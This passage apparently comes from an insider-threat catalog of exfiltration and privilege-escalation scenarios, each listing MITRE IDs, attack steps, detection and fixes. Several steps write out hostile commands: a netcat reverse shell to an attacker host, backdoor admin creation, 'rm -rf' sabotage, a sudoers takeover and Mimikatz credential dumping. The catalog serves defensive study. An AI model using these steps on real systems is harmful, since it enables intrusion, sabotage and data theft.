- **Solution**: Restrict USB transfer modes
- **Tags**: usb, phone, offline exfil

## Hidden Message in Code Comments

- **Attack Type**: Data Exfiltration
- **Target**: Source Code Repo
- **Vulnerability**: No code review or secrets scan
- **MITRE**: T1020 (Automated Exfil - Source Control)
- **Impact**: Credential leak through code
- **Tools**: Code Editor, Git
- **Scenario**: Developer hides passwords and tokens in source code comments pushed to GitHub.
- **Attack Steps**: Step 1: Edit a regular source code file (e.g., login.js).Step 2: Insert sensitive credentials in comment section: // token: 123456789.Step 3: Commit and push the file to public/private GitHub repo.Step 4: Access GitHub repo at home and extract the credentials.Step 5: Delete commit later if necessary.
- **Detection**: Git hooks, code scan tools
- **Solution**: Secret detection tools (e.g., GitLeaks)
- **Tags**: git, code, dev exfil

## Browser Extension-Based Exfil

- **Attack Type**: Data Exfiltration
- **Target**: Web Browser
- **Vulnerability**: No extension whitelisting
- **MITRE**: T1176 (Browser Extensions)
- **Impact**: Background exfiltration
- **Tools**: Malicious Extension
- **Scenario**: Insider installs a malicious browser extension that silently captures and uploads data.
- **Attack Steps**: Step 1: Open Chrome Web Store.Step 2: Install an unverified extension with file access permissions.Step 3: Extension runs in background and monitors browsing.Step 4: It copies clipboard or page content and sends to attacker’s server.Step 5: Insider removes extension to cover tracks.
- **Detection**: Browser extension audit, anomaly detection
- **Solution**: Use managed browser policies
- **Tags**: chrome, extension, background exfil

## Exfil via Voice Memo Dictation

- **Attack Type**: Data Exfiltration
- **Target**: Credentials File
- **Vulnerability**: No phone policy
- **MITRE**: T1056 (Input Capture)
- **Impact**: Verbal leak of critical data
- **Tools**: Voice Recorder App
- **Scenario**: Insider reads out passwords into phone using voice recorder.
- **Attack Steps**: Step 1: Open Notes file or password vault on computer.Step 2: On mobile phone, open voice recorder app.Step 3: Dictate sensitive data like “Server password is capital P at symbol…”Step 4: Save and rename recording to something innocent (e.g., “Meeting.mp3”).Step 5: Access and transcribe later from phone.
- **Detection**: Phone detection, audio anomaly detection
- **Solution**: Restrict mobile phones in sensitive areas
- **Tags**: voice, audio, verbal exfil

## Copy via Shared Clipboard in VDI

- **Attack Type**: Data Exfiltration
- **Target**: VDI Session
- **Vulnerability**: Clipboard not isolated
- **MITRE**: T1056.001 (Input Capture)
- **Impact**: Cross-environment data theft
- **Tools**: Virtual Desktop, Clipboard
- **Scenario**: Insider abuses shared clipboard in virtual desktop to transfer data to personal PC.
- **Attack Steps**: Step 1: Open virtual desktop session on corporate machine.Step 2: Copy confidential text or file name using Ctrl+C.Step 3: Switch to host (personal) machine and paste using Ctrl+V.Step 4: Save pasted data to personal storage.Step 5: Logout and clear clipboard history.
- **Detection**: VDI clipboard logs, session recordings
- **Solution**: Disable shared clipboard in VDI
- **Tags**: clipboard, VDI, cross environment

## Wi-Fi Transfer to Personal Laptop

- **Attack Type**: Data Exfiltration
- **Target**: Network
- **Vulnerability**: No Wi-Fi control policies
- **MITRE**: T1041 (Exfil Over C2 Channel - Wi-Fi)
- **Impact**: Bypasses firewall controls
- **Tools**: Ad-hoc Wi-Fi, File Sharing
- **Scenario**: Insider connects personal laptop via ad-hoc Wi-Fi and transfers files over shared folder.
- **Attack Steps**: Step 1: Set up personal laptop as Wi-Fi hotspot.Step 2: On office computer, connect to that hotspot.Step 3: Share a folder on the laptop.Step 4: From office PC, access the shared folder using Run → \\192.168.x.x.Step 5: Drag and drop files into the shared folder.Step 6: Disconnect after transfer.
- **Detection**: Network scan, hotspot detection
- **Solution**: Disable ad-hoc Wi-Fi; use NAC
- **Tags**: wifi, transfer, ad hoc exfil

## Compress and Encrypt Before Exfil

- **Attack Type**: Data Exfiltration
- **Target**: Workstation
- **Vulnerability**: No password zip detection
- **MITRE**: T1022 (Data Encrypted for Exfil)
- **Impact**: Obfuscated exfil traffic
- **Tools**: WinRAR, 7-Zip
- **Scenario**: Insider compresses data into password-protected zip to avoid detection.
- **Attack Steps**: Step 1: Select sensitive folders/files (e.g., /finance/reports).Step 2: Right-click and select “Add to Archive”.Step 3: Enable password protection and encrypt file names.Step 4: Save as backup.zip on Desktop.Step 5: Upload to Google Drive or email it.Step 6: Download and extract at home.
- **Detection**: Detect zip/encrypt tools, password alerts
- **Solution**: Block encrypted archive uploads
- **Tags**: zip, encryption, archive bypass

## FTP Upload to External Server

- **Attack Type**: Data Exfiltration
- **Target**: External Server
- **Vulnerability**: No FTP blocking on network
- **MITRE**: T1048.002 (Exfil via Protocol - FTP)
- **Impact**: Direct remote exfil bypassing firewall
- **Tools**: FileZilla, External FTP Server
- **Scenario**: Insider uploads files using FTP client to a personal server.
- **Attack Steps**: Step 1: Open FTP client (e.g., FileZilla).Step 2: Enter personal FTP server IP, username, and password.Step 3: Connect and browse to upload folder.Step 4: Drag confidential files to remote folder.Step 5: Verify upload and disconnect.Step 6: Delete FTP log or file history.
- **Detection**: FTP traffic logs, anomaly detection
- **Solution**: Block FTP protocol, alert on FileZilla
- **Tags**: ftp, filezilla, direct exfil

## Clipboard to Chat Application

- **Attack Type**: Data Exfiltration
- **Target**: Browser Clipboard
- **Vulnerability**: Chat monitoring not enabled
- **MITRE**: T1071.001 (Application Layer - Chat)
- **Impact**: Bypasses DLP via browser clipboard
- **Tools**: Browser, Chat App
- **Scenario**: Insider copies text and pastes it into chat app like WhatsApp Web or Telegram.
- **Attack Steps**: Step 1: Copy sensitive content from internal system (e.g., Ctrl+C).Step 2: Open WhatsApp Web or Telegram Web.Step 3: Paste data into chat window with self-contact or external contact.Step 4: Send and delete chat afterward.Step 5: Access data from mobile later.
- **Detection**: Monitor chat/web app usage
- **Solution**: Block personal messengers
- **Tags**: clipboard, chat, telegram, whatsapp

## Auto-sync to Personal NAS

- **Attack Type**: Data Exfiltration
- **Target**: Networked Storage
- **Vulnerability**: No restriction on mapped drives
- **MITRE**: T1041 (Exfil via Network Services)
- **Impact**: Silent, persistent exfiltration
- **Tools**: NAS, Sync Software
- **Scenario**: Insider maps network drive to home NAS (Network Attached Storage) and enables auto-sync.
- **Attack Steps**: Step 1: Map network drive to personal NAS (via IP like \\192.168.0.100).Step 2: Use file sync tool (like SyncBack) to schedule daily sync of target folders.Step 3: Let files sync silently in background.Step 4: Disconnect drive during logout.Step 5: Review exfiltrated files at home.
- **Detection**: Detect mapped drives, sync logs
- **Solution**: Block SMB to unknown IPs
- **Tags**: NAS, network sync, stealth exfil

## Mobile Hotspot with Auto Sync

- **Attack Type**: Data Exfiltration
- **Target**: PC, Cloud
- **Vulnerability**: Bypass via alternate internet route
- **MITRE**: T1041 (Exfil Over Alternative Network)
- **Impact**: Covert transfer bypassing corporate internet
- **Tools**: Mobile Hotspot, Google Drive Sync
- **Scenario**: Insider connects office PC to personal hotspot and uploads files to auto-sync folder.
- **Attack Steps**: Step 1: Turn on mobile hotspot and connect office PC.Step 2: Ensure personal Google Drive sync folder is available.Step 3: Move files to the sync folder (e.g., C:\Users\XYZ\GoogleDrive\WorkLeak).Step 4: Wait for sync to complete.Step 5: Access data at home via Drive.
- **Detection**: Detect hotspot MACs, dual connection alert
- **Solution**: Disable Wi-Fi when LAN active, restrict Drive
- **Tags**: hotspot, auto-sync, alt net

## Hidden ZIP in JPEG Attachment

- **Attack Type**: Data Exfiltration
- **Target**: Email
- **Vulnerability**: No content analysis inside images
- **MITRE**: T1027.003 (Steganography)
- **Impact**: Exfil in disguised attachments
- **Tools**: WinRAR, Email
- **Scenario**: Insider embeds ZIP archive inside a JPEG image and sends it via email.
- **Attack Steps**: Step 1: Use WinRAR to create archive secret.zip with confidential docs.Step 2: Use a tool or command to append it to a JPEG: copy /b photo.jpg + secret.zip combined.jpg.Step 3: Attach combined.jpg to Gmail.Step 4: Send it to personal email.Step 5: At home, extract ZIP from image using WinRAR.
- **Detection**: Image signature scanner, sandbox extraction
- **Solution**: Block multi-format MIME uploads
- **Tags**: image exfil, zip-in-jpg

## Webcam-Based Screen Recording

- **Attack Type**: Data Exfiltration
- **Target**: Display Monitor
- **Vulnerability**: No webcam monitoring
- **MITRE**: T1113 (Screen Capture)
- **Impact**: Data theft via indirect method
- **Tools**: Webcam, Recording App
- **Scenario**: Insider uses external webcam facing the screen to record confidential visuals.
- **Attack Steps**: Step 1: Place small webcam discreetly on desk facing screen.Step 2: Start recording using basic webcam software.Step 3: Work normally while camera records.Step 4: Save video and copy to USB or email.Step 5: View footage later to extract visuals.
- **Detection**: Detect new USB webcams, monitor app installs
- **Solution**: Block USB webcams, CCTV surveillance
- **Tags**: webcam, indirect, stealth

## Use of GitHub Gists

- **Attack Type**: Data Exfiltration
- **Target**: Web Code/Docs
- **Vulnerability**: Unmonitored pastebin/Gist usage
- **MITRE**: T1105 (Remote File Copy - Gist)
- **Impact**: Silent code/data leak
- **Tools**: Web Browser, GitHub
- **Scenario**: Insider pastes confidential code snippets into GitHub Gists marked "public" or "secret".
- **Attack Steps**: Step 1: Open https://gist.github.com on browser.Step 2: Paste code or data into Gist editor.Step 3: Select "Secret" visibility (not truly secret).Step 4: Click "Create Gist".Step 5: Access it later from home GitHub account.
- **Detection**: URL monitor, pastebin/Gist filter
- **Solution**: Block dev paste tools, restrict GitHub
- **Tags**: gist, github, paste exfil

## Shared Clipboard via Zoom Chat

- **Attack Type**: Data Exfiltration
- **Target**: Zoom
- **Vulnerability**: Chat not logged/monitored
- **MITRE**: T1071.001 (Chat Application Layer)
- **Impact**: Real-time off-network exfiltration
- **Tools**: Zoom, Chat
- **Scenario**: Insider pastes sensitive content into Zoom chat to external participant or self.
- **Attack Steps**: Step 1: Join a Zoom meeting (1-on-1 or with friend).Step 2: Open Zoom chat and paste confidential info (text, credentials).Step 3: Press Enter to send.Step 4: Recipient outside network receives it instantly.Step 5: Chat auto-clears if feature is disabled.
- **Detection**: Zoom chat log review, DLP
- **Solution**: Restrict chat to internal users only
- **Tags**: zoom, chat exfil, real-time

## Keylogging into Notes App

- **Attack Type**: Data Exfiltration
- **Target**: Phone
- **Vulnerability**: Manual exfil not detected by tools
- **MITRE**: T1056 (Input Capture - Manual)
- **Impact**: Data typed off-device
- **Tools**: Phone, Notes App
- **Scenario**: Insider types confidential data manually into phone’s Notes app during a meeting.
- **Attack Steps**: Step 1: Open Notes app (e.g., Google Keep, Apple Notes).Step 2: During meeting or work, read data from screen.Step 3: Type data manually into note (e.g., passwords, figures).Step 4: Save and sync note to cloud.Step 5: Access from home device.
- **Detection**: Phone bans, visual surveillance
- **Solution**: Restrict phone use in sensitive areas
- **Tags**: note taking, manual exfil

## Upload to Pastebin

- **Attack Type**: Data Exfiltration
- **Target**: Web Browser
- **Vulnerability**: Pastebin not blocked
- **MITRE**: T1105 (Exfil via Web Service)
- **Impact**: Public exposure of sensitive data
- **Tools**: Pastebin, Browser
- **Scenario**: Insider copies and pastes data to Pastebin.com and shares the link.
- **Attack Steps**: Step 1: Copy sensitive data from internal system.Step 2: Go to https://pastebin.com in browser.Step 3: Paste data and set “Unlisted” or “Public”.Step 4: Click "Create New Paste".Step 5: Save the URL and access later.Step 6: Share via text or chat if needed.
- **Detection**: Proxy logs, pastebin alerts
- **Solution**: Block Pastebin and similar tools
- **Tags**: pastebin, browser exfil

## Encoding Data in Audio File

- **Attack Type**: Data Exfiltration
- **Target**: Email, Audio File
- **Vulnerability**: No content scan in audio
- **MITRE**: T1027.003 (Steganography)
- **Impact**: Hidden exfil in media
- **Tools**: Steghide, Audacity, Email
- **Scenario**: Insider hides data in WAV or MP3 file using audio steganography and shares via email.
- **Attack Steps**: Step 1: Use tool like Steghide or Audacity with plugin.Step 2: Embed confidential.txt into meeting.wav file.Step 3: Attach WAV file to email labeled “Meeting Notes”.Step 4: Send to personal address.Step 5: Extract at home using Steghide command.
- **Detection**: Stego detectors, email attachment scanner
- **Solution**: Block media attachments or inspect content
- **Tags**: audio stego, mp3 exfil

## Access Through Public Cloud App

- **Attack Type**: Data Exfiltration
- **Target**: Public Cloud
- **Vulnerability**: Public transfer apps not blocked
- **MITRE**: T1048.003 (Web Exfil via Cloud)
- **Impact**: Unrestricted external transfer
- **Tools**: Browser, WeTransfer, pCloud
- **Scenario**: Insider uses public apps like WeTransfer or pCloud to upload large files.
- **Attack Steps**: Step 1: Go to https://wetransfer.com or https://pcloud.comStep 2: Upload zipped confidential files.Step 3: Enter own personal email as recipient.Step 4: Click "Send" and confirm email.Step 5: Access and download files at home.
- **Detection**: Web filtering, allowlist tools
- **Solution**: Block unapproved file-sharing services
- **Tags**: wetransfer, pcloud, cloud exfil

## Text Data Hidden in Image Pixels

- **Attack Type**: Data Exfiltration
- **Target**: Social Media
- **Vulnerability**: Covert data in harmless-looking file
- **MITRE**: T1027.003 (Steganography)
- **Impact**: Stealthy social post-based exfiltration
- **Tools**: OpenStego, Social Media
- **Scenario**: Insider encodes data into pixel color values of an image and posts on social media.
- **Attack Steps**: Step 1: Use OpenStego to hide secret.txt into an image (e.g., teamphoto.jpg).Step 2: Save output image.Step 3: Upload the image to personal Instagram, Twitter.Step 4: Later download and extract hidden file.Step 5: Delete image post.
- **Detection**: Stego scan tools, image analysis
- **Solution**: Block social uploads, inspect images
- **Tags**: image stego, pixel hack, covert exfil

## Local Admin Privilege Abuse via Shared Password

- **Attack Type**: Privilege Escalation
- **Target**: Windows System
- **Vulnerability**: Poor password hygiene
- **MITRE**: T1078 - Valid Accounts
- **Impact**: Unauthorized software with admin access
- **Tools**: None
- **Scenario**: An intern gains access to a shared local admin password from a sticky note on a system and uses it to install unauthorized apps.
- **Attack Steps**: Step 1: Insider notices a sticky note with "Admin123!" near a shared computer. Step 2: Insider logs in to the user account, then tries to install an application. Step 3: When prompted for admin access, enters the "Admin123!" password. Step 4: The system accepts the password and gives elevated access. Step 5: Insider installs unauthorized software that can steal data. Step 6: Leaves no trace except new app in system.
- **Detection**: Endpoint monitoring of new software installs
- **Solution**: Use password managers, avoid shared/admin passwords
- **Tags**: Windows, Insider, Sticky Note, Local Admin

## Bypass UAC Using Misconfigured Task Scheduler

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Misconfigured Scheduled Tasks
- **MITRE**: T1053.005 - Scheduled Task
- **Impact**: Unauthorized admin access
- **Tools**: Task Scheduler
- **Scenario**: A support staff discovers that the Task Scheduler is configured to run scripts as admin and abuses it.
- **Attack Steps**: Step 1: Insider searches the computer for scheduled tasks. Step 2: Finds a task named "AutoBackup" that runs with highest privileges. Step 3: Right-clicks and edits the action to run cmd.exe instead. Step 4: Runs the task manually. Step 5: A command prompt opens with administrator access. Step 6: Insider uses it to add a new local admin user.
- **Detection**: Log monitoring for Task Scheduler changes
- **Solution**: Review scheduled tasks for unnecessary privileges
- **Tags**: UAC Bypass, Task Scheduler, Windows

## Exploiting Sudo Misconfiguration in Linux

- **Attack Type**: Privilege Escalation
- **Target**: Linux System
- **Vulnerability**: Sudo misconfiguration
- **MITRE**: T1548.003 - Sudo and Sudo Caching
- **Impact**: Full system control
- **Tools**: Terminal
- **Scenario**: An intern discovers they can run a harmless command with sudo but uses it to gain root shell.
- **Attack Steps**: Step 1: Insider opens terminal and types sudo -l to list allowed commands. Step 2: Notices they can run sudo nano without a password. Step 3: Uses sudo nano to edit /etc/sudoers file. Step 4: Adds their user with ALL=(ALL) NOPASSWD:ALL access. Step 5: Saves file, exits nano. Step 6: Now types sudo su to get full root access.
- **Detection**: Audit /etc/sudoers, check /var/log/auth.log
- **Solution**: Limit sudo access and review configs regularly
- **Tags**: Linux, Sudo, Root Privilege

## Token Impersonation via Helpdesk Credential

- **Attack Type**: Privilege Escalation
- **Target**: Windows Server
- **Vulnerability**: Token reuse after session logout
- **MITRE**: T1134.001 - Token Impersonation
- **Impact**: Unauthorized admin control
- **Tools**: Windows RDP, Mimikatz
- **Scenario**: A helpdesk agent uses leftover admin token from RDP session to escalate privileges.
- **Attack Steps**: Step 1: Insider logs in as helpdesk on a shared server. Step 2: Notices a recently disconnected RDP session of an admin. Step 3: Downloads and runs Mimikatz (a credential tool). Step 4: Uses command sekurlsa::logonpasswords to view stored credentials. Step 5: Extracts admin token and impersonates using token::elevate. Step 6: Gains full admin access to the system.
- **Detection**: RDP session monitoring, use of credential guard
- **Solution**: Enable LSASS protection, restrict RDP access
- **Tags**: Token Abuse, Windows, RDP

## Misuse of IT Maintenance Script with Hardcoded Credentials

- **Attack Type**: Privilege Escalation
- **Target**: Windows System
- **Vulnerability**: Hardcoded credentials in script
- **MITRE**: T1552.001 - Credentials in Files
- **Impact**: Credential theft and privilege abuse
- **Tools**: PowerShell
- **Scenario**: A technician discovers a PowerShell script that contains hardcoded admin credentials and uses it for privilege escalation.
- **Attack Steps**: Step 1: Insider opens IT maintenance folder on a shared drive. Step 2: Finds a script like cleanup.ps1. Step 3: Opens it in notepad and sees username = "admin" and password = "Admin@123". Step 4: Copies these credentials. Step 5: Uses runas command to start a privileged session. Step 6: Gains access to sensitive system files.
- **Detection**: Monitor access to internal scripts
- **Solution**: Encrypt scripts, avoid credential reuse
- **Tags**: PowerShell, Hardcoded, Insider

## DLL Hijacking from Writable App Folder

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: DLL Search Order Hijacking
- **MITRE**: T1574.001
- **Impact**: SYSTEM-level compromise
- **Tools**: Windows Explorer
- **Scenario**: Insider drops a malicious DLL in an application folder that is writable and loaded by a trusted service.
- **Attack Steps**: Step 1: Insider searches for program folders inside C:\Program Files with write permissions. Step 2: Finds C:\Program Files\AppX where they can copy files. Step 3: Opens app documentation and identifies it loads print.dll. Step 4: Replaces print.dll with a malicious DLL (pre-made from GitHub). Step 5: Runs the app, which loads the DLL and executes code as SYSTEM. Step 6: Gains SYSTEM-level shell.
- **Detection**: EDR alerts on DLL injection
- **Solution**: Restrict folder permissions, use signed DLLs
- **Tags**: DLL Hijack, AppX, Windows

## Exploiting Misconfigured Service Binary Path

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Unquoted Service Path or Modifiable Service
- **MITRE**: T1543.003
- **Impact**: Remote system control
- **Tools**: Services.msc, PowerShell
- **Scenario**: Insider edits service binary path to launch a reverse shell instead of the legit service.
- **Attack Steps**: Step 1: Opens Services app and finds service running as SYSTEM. Step 2: Edits service properties and replaces binary path with a reverse shell script (powershell -nop -c "..."). Step 3: Restarts the service manually. Step 4: Reverse shell triggers, giving remote access. Step 5: Gains full system access using SYSTEM privileges.
- **Detection**: Windows service creation and modification logs
- **Solution**: Set correct permissions and quotes in paths
- **Tags**: Service Misconfig, Reverse Shell

## Abuse of AlwaysInstallElevated Policy

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Weak Group Policy setting
- **MITRE**: T1548.002
- **Impact**: Hidden admin account creation
- **Tools**: Orca MSI Editor, MSI Shell
- **Scenario**: A junior admin discovers that the system allows .msi files to be installed with elevated privileges and uses it to gain admin.
- **Attack Steps**: Step 1: Insider checks registry keys HKLM\Software\Policies\Microsoft\Windows\Installer and confirms AlwaysInstallElevated=1. Step 2: Downloads Orca, a tool to edit MSI installers. Step 3: Creates a malicious .msi that adds a new admin user. Step 4: Runs the MSI file. Step 5: A new admin account is created silently. Step 6: Logs into the system using new account.
- **Detection**: Monitor for MSI installs and user creation logs
- **Solution**: Disable AlwaysInstallElevated registry key
- **Tags**: MSI, Admin Account, Registry

## SUID Binary Exploitation on Linux

- **Attack Type**: Privilege Escalation
- **Target**: Linux
- **Vulnerability**: SUID binary running shell
- **MITRE**: T1548.001
- **Impact**: Root access via SUID misuse
- **Tools**: Terminal
- **Scenario**: User finds a SUID binary that allows command execution and uses it to escalate to root.
- **Attack Steps**: Step 1: Runs find / -perm -4000 2>/dev/null to list SUID binaries. Step 2: Finds /usr/bin/backup_tool that runs as root. Step 3: Opens the binary using strings and finds it's calling /bin/sh. Step 4: Runs the binary and types !sh or injects a shell. Step 5: Gets root shell. Step 6: Copies data or creates a new root account.
- **Detection**: Monitor binary executions
- **Solution**: Remove or patch insecure SUID binaries
- **Tags**: SUID, Linux, Privilege Escalation

## Reuse of Hardcoded Jenkins Admin Token

- **Attack Type**: Privilege Escalation
- **Target**: Jenkins
- **Vulnerability**: Token reuse from old scripts
- **MITRE**: T1552.001
- **Impact**: CI/CD tampering and sabotage
- **Tools**: Jenkins, Browser
- **Scenario**: Developer extracts hardcoded Jenkins admin token from script and uses it to modify pipeline with malicious code.
- **Attack Steps**: Step 1: Insider accesses internal Git repo. Step 2: Finds old deployment script with JENKINS_TOKEN = admin_789xyz. Step 3: Opens Jenkins portal and logs in using token. Step 4: Accesses job config and inserts rm -rf /shared. Step 5: Job runs and deletes sensitive shared files. Step 6: Privilege maintained until token revoked.
- **Detection**: Audit token usage in Jenkins logs
- **Solution**: Rotate and encrypt tokens, remove secrets from repos
- **Tags**: Jenkins, Token, DevOps Abuse

## Kernel Driver Load from Signed but Vulnerable Driver

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: BYOVD technique
- **MITRE**: T1068
- **Impact**: Kernel-level malware deployment
- **Tools**: Exploit Driver, Windows
- **Scenario**: Insider uses Bring Your Own Vulnerable Driver (BYOVD) to disable antivirus and gain kernel-level access.
- **Attack Steps**: Step 1: Downloads a known vulnerable driver (e.g., RTCore64.sys). Step 2: Uses admin-level account to load driver using sc.exe command. Step 3: Exploits vulnerability in driver to disable endpoint protection. Step 4: Drops malware payload that gets kernel privileges. Step 5: Operates undetected. Step 6: Moves laterally or exfiltrates data.
- **Detection**: Device control + driver monitoring
- **Solution**: Block unsigned/vulnerable driver loads
- **Tags**: BYOVD, Kernel, Windows

## MacOS TCC Bypass via Local Database Edit

- **Attack Type**: Privilege Escalation
- **Target**: MacOS
- **Vulnerability**: TCC local DB not integrity-checked
- **MITRE**: T1548.002
- **Impact**: Covert access to audio/video feeds
- **Tools**: DB Browser for SQLite
- **Scenario**: Insider modifies the TCC database on MacOS to grant apps webcam and mic access without prompts.
- **Attack Steps**: Step 1: Insider gets physical access to Mac. Step 2: Opens Terminal and navigates to ~/Library/Application Support/com.apple.TCC/TCC.db. Step 3: Opens the database in SQLite editor. Step 4: Inserts rows to grant zoom.us access to camera and mic. Step 5: Launches Zoom without permission request. Step 6: Uses Zoom to spy via mic/webcam.
- **Detection**: Monitor TCC.db changes
- **Solution**: Lock TCC with MDM + SIP
- **Tags**: MacOS, TCC Bypass, Camera Access

## Cloud Role Escalation via IAM Policy Abuse

- **Attack Type**: Privilege Escalation
- **Target**: Cloud (AWS)
- **Vulnerability**: Misconfigured IAM permissions
- **MITRE**: T1098.004
- **Impact**: Full cloud environment compromise
- **Tools**: AWS Console
- **Scenario**: A cloud engineer escalates their permissions by modifying IAM policy granting themselves admin.
- **Attack Steps**: Step 1: Insider logs into AWS console with ReadOnly role. Step 2: Finds an S3 bucket with Terraform state files. Step 3: Reads the state file and sees IAM policy JSON. Step 4: Uses CLI to apply new policy attaching AdministratorAccess to own user. Step 5: Gains full AWS control. Step 6: Spins up EC2 instance for backdoor.
- **Detection**: IAM audit logs
- **Solution**: Least privilege, monitor Terraform state access
- **Tags**: AWS, IAM, Policy Abuse

## Exploiting Weak File Permissions on Linux Cron

- **Attack Type**: Privilege Escalation
- **Target**: Linux
- **Vulnerability**: Insecure file permissions in cron
- **MITRE**: T1053.003
- **Impact**: Unauthorized root user creation
- **Tools**: Nano Editor
- **Scenario**: Insider modifies a scheduled cron job that runs as root but editable by any user.
- **Attack Steps**: Step 1: Runs ls -l /etc/cron.d and finds a file backupjob with -rw-rw-rw- permissions. Step 2: Opens the file with nano. Step 3: Replaces script path with /tmp/malicious.sh. Step 4: Places custom script to create root user. Step 5: Waits until cron job runs (hourly). Step 6: Logs in as new root user.
- **Detection**: Monitor cron file changes
- **Solution**: Secure cron job permissions
- **Tags**: Linux, Cron, File Abuse

## Abuse of Shared Service Account with Admin Rights

- **Attack Type**: Privilege Escalation
- **Target**: Windows Server
- **Vulnerability**: Shared credentials with high privileges
- **MITRE**: T1078.002
- **Impact**: Unauthorized admin-level actions
- **Tools**: KeePass, RDP
- **Scenario**: A staff member finds stored credentials for a service account with local admin rights and reuses them.
- **Attack Steps**: Step 1: Insider opens KeePass vault (team shared) for troubleshooting. Step 2: Finds entry svc_admin with password. Step 3: Uses RDP to connect to a critical server. Step 4: Enters svc_admin credentials. Step 5: Gets local admin access. Step 6: Starts installing and modifying services.
- **Detection**: Vault access logs + endpoint behavior
- **Solution**: Limit shared accounts, audit secrets
- **Tags**: RDP, Service Account, Vault Abuse

## Gaining Admin via Installer with Embedded Admin Manifest

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Insecure UAC configuration
- **MITRE**: T1548.002
- **Impact**: New hidden admin account
- **Tools**: Visual Studio, Resource Hacker
- **Scenario**: Intern compiles a fake installer (.exe) with embedded manifest requesting elevation, and tricks system into auto-elevating it.
- **Attack Steps**: Step 1: Insider creates a fake installer using Visual Studio or EXE builder. Step 2: Edits the EXE's manifest file to include requireAdministrator. Step 3: Places the file in a public Downloads folder. Step 4: Double-clicks EXE; UAC prompt appears but auto-accepts due to misconfigured policy. Step 5: Installer creates an admin account silently. Step 6: Insider logs in with new admin.
- **Detection**: Monitor executable elevation events
- **Solution**: Enforce UAC prompt and app whitelisting
- **Tags**: UAC, Manifest Abuse, EXE

## Windows Credential Manager Abuse

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Stored credentials in Credential Manager
- **MITRE**: T1555.004
- **Impact**: Admin access with saved tokens
- **Tools**: cmdkey.exe
- **Scenario**: Insider uses cmdkey tool to list and use stored admin credentials from Credential Manager.
- **Attack Steps**: Step 1: Opens Command Prompt. Step 2: Runs cmdkey /list to list saved credentials. Step 3: Finds saved entry for Domain\Admin. Step 4: Runs runas /user:Domain\Admin cmd.exe and enters blank password (auto-filled). Step 5: Gets elevated command shell. Step 6: Uses access to create new user account.
- **Detection**: Credential Manager audit, UAC logs
- **Solution**: Clear stored creds, use password vaults
- **Tags**: Credential Abuse, cmdkey

## LPE via Vulnerable Printer Spooler (PrintNightmare CVE-2021-34527)

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: CVE-2021-34527 (PrintNightmare)
- **MITRE**: T1068
- **Impact**: SYSTEM access
- **Tools**: PowerShell, PrintNightmare exploit script
- **Scenario**: Insider exploits a known printer vulnerability to gain SYSTEM privileges on unpatched machine.
- **Attack Steps**: Step 1: Insider checks Windows version (must be unpatched). Step 2: Runs PowerShell script available online exploiting Print Spooler. Step 3: Exploit uploads malicious DLL to spooler service. Step 4: Spooler executes DLL as SYSTEM. Step 5: Gets SYSTEM shell via reverse shell. Step 6: Disables antivirus and makes registry changes.
- **Detection**: Patch management logs, unusual spooler DLLs
- **Solution**: Disable spooler, apply patch
- **Tags**: CVE, Print Spooler, SYSTEM

## Password Spraying with Local Accounts

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Weak passwords on local accounts
- **MITRE**: T1110.003
- **Impact**: Unauthorized admin login
- **Tools**: Windows Login
- **Scenario**: Disgruntled employee tries common passwords against multiple known local admin accounts using built-in login screen.
- **Attack Steps**: Step 1: Insider reboots shared system. Step 2: From login screen, chooses "Other User". Step 3: Tries usernames like admin, administrator, itadmin. Step 4: Tries common passwords like Welcome@123, Admin@2023. Step 5: Logs in successfully as itadmin. Step 6: Uses admin access to install tools or steal files.
- **Detection**: Failed login monitoring, account lockout policy
- **Solution**: Enforce strong passwords, MFA
- **Tags**: Password Spray, Login Abuse

## Exploiting .bashrc on Root Shell via Cron Job

- **Attack Type**: Privilege Escalation
- **Target**: Linux
- **Vulnerability**: Bash startup file injection
- **MITRE**: T1053.003
- **Impact**: Root access via reverse shell
- **Tools**: Bash, Netcat
- **Scenario**: User modifies .bashrc to inject a reverse shell which gets executed during root’s cron job.
- **Attack Steps**: Step 1: Insider finds that root cron job runs bash as root daily. Step 2: Modifies /root/.bashrc to include reverse shell command (e.g., nc -e /bin/sh attacker_ip port). Step 3: Waits until cron job executes. Step 4: Receives root shell on attacker's machine. Step 5: Transfers sensitive files.
- **Detection**: Monitor .bashrc changes
- **Solution**: Restrict root cron to static env
- **Tags**: Linux, .bashrc, Root Shell

## Exploiting Local Git Hook with Admin Execution Context

- **Attack Type**: Privilege Escalation
- **Target**: Windows
- **Vulnerability**: Git hook abuse
- **MITRE**: T1059.003
- **Impact**: Silent admin user creation
- **Tools**: Git Bash
- **Scenario**: Developer exploits pre-commit Git hook which runs as admin to run arbitrary commands.
- **Attack Steps**: Step 1: Insider finds .git/hooks/pre-commit file on shared repo. Step 2: Notices it executes validation script as admin. Step 3: Appends net user backdoor Pass@123 /add && net localgroup administrators backdoor /add to hook. Step 4: Commits a dummy file. Step 5: Hook runs, executes command as admin. Step 6: Logs in using new backdoor account.
- **Detection**: Git logs, admin account creation alerts
- **Solution**: Avoid admin context for hooks
- **Tags**: Git, Hooks, Dev Exploit

## Escalating via WinRM Enabled by Default

- **Attack Type**: Privilege Escalation
- **Target**: Windows Network
- **Vulnerability**: Weak access control on WinRM
- **MITRE**: T1021.006
- **Impact**: Remote code execution
- **Tools**: PowerShell, WinRM
- **Scenario**: Insider uses Windows Remote Management to run PowerShell remotely on another device using stolen admin creds.
- **Attack Steps**: Step 1: Gets credentials from shared documentation (admin/Admin@321). Step 2: Runs Enter-PSSession -ComputerName TARGET -Credential admin. Step 3: Starts PowerShell session on target. Step 4: Runs script to add admin user or open firewall. Step 5: Maintains persistence.
- **Detection**: PowerShell logs, WinRM audit
- **Solution**: Disable WinRM unless needed
- **Tags**: PowerShell, Remote Management

## Docker Breakout to Host Privilege

- **Attack Type**: Privilege Escalation
- **Target**: Linux Docker Host
- **Vulnerability**: Insecure Docker socket
- **MITRE**: T1611
- **Impact**: Container escape, root host control
- **Tools**: Docker, Bash
